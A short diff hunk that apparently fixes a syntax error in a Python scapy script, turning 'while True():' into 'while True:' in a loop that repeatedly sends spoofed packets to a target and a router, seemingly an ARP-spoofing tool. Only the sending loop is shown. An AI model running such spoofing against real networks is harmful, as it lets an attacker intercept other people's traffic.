@@ -79,7 +79,7 @@ def main():
 #    start_flow(interface)
 
     print("[+] Spoofing has begin")
-    while True():
+    while True:
         scapy.send(packet_for_target)
         scapy.send(packet_for_router)
         time.sleep(3)
